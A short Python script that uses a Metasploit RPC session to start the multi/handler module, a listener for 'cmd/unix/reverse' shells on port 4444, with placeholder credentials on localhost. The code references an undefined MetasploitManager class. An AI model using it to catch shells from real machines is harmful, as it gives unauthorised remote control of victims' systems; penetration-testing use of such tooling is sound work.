#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time
import logging, coloredlogs

from MetasploitSession import MetasploitSession

logger = logging.getLogger('Metasploit')
coloredlogs.install(level='DEBUG', logger=logger)

def main():
    host = '127.0.0.1'
    username = 'username'
    password = 'password'
    uri = f'http://{host}:55553/api'

    listen_addr = host
    listen_port = 4444
    payload = 'cmd/unix/reverse'
    
    try:
        with MetasploitSession(username, password, uri) as session:
            if session._token is None:
                raise Exception('login failed. check credentials')
            with MetasploitManager(session) as mgr:
                opts = {
                    'ExitOnSession': False,
                    'PAYLOAD': payload,
                    'LHOST': listen_addr,
                    'LPORT': listen_port
                }
                resp = mgr.exec_module('exploit', 'multi/handler', opts)
                job_id = resp['job_id']
    except Exception as e:
        print(e)

if __name__ == '__main__':
    main()
